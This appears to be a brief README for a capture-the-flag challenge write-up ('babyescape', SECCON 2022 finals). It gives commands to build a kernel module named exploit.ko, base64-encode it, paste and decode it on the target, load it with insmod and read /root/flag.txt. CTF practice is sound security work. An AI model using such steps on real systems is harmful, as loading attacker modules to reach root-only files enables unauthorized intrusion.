# seccon-2022-final-babyescape-writeup
```
./download_and_configure_kernel.sh
make
base64 exploit.ko | xsel -bi
```

```
busybox echo '<paste base64 exploit.ko>' | busybox base64 -d > exploit.ko
busybox insmod exploit.ko
cat /root/flag.txt
```
